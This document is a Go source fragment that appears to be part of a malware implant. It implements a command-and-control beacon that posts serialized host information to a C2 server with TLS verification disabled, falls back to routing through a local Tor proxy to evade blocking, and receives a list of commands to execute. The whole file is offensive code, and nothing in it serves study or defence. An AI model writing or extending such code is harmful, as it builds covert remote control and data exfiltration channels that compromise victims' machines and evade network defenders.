package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"golang.org/x/net/proxy"
)

const (
	// SOCKS5 proxy address Tor client
	torProxyAddr = "127.0.0.1:9050"
	// Timeout
	reqTimeout = 15 * time.Second
)

func doC2Request(data []byte) ([]byte, error) {
	directTransport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	directClient := &http.Client{
		Timeout:   reqTimeout,
		Transport: directTransport,
	}

	resp, err := directClient.Post(c2URL, "application/json", bytes.NewReader(data))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			return io.ReadAll(resp.Body)
		}
		log.Printf("direct POST returned status %d; falling back to Tor", resp.StatusCode)
	} else {
		log.Printf("direct POST error: %v; falling back to Tor", err)
	}

	dialer, err := proxy.SOCKS5("tcp", torProxyAddr, nil, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("failed to create Tor dialer: %w", err)
	}
	torTransport := &http.Transport{
		Dial:            dialer.Dial,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	torClient := &http.Client{
		Timeout:   reqTimeout,
		Transport: torTransport,
	}

	respTor, err := torClient.Post(c2URL, "application/json", bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("Tor POST error: %w", err)
	}
	defer respTor.Body.Close()
	if respTor.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("Tor POST returned status %d", respTor.StatusCode)
	}
	return io.ReadAll(respTor.Body)
}

func beacon(info HostInfo) []string {
	payload, err := json.Marshal(info)
	if err != nil {
		log.Printf("failed to marshal HostInfo: %v", err)
		return nil
	}

	body, err := doC2Request(payload)
	if err != nil {
		log.Printf("C2 request error: %v", err)
		return nil
	}

	var cmds []string
	if err := json.Unmarshal(body, &cmds); err != nil {
		log.Printf("failed to unmarshal C2 response: %v", err)
		return nil
	}
	return cmds
}
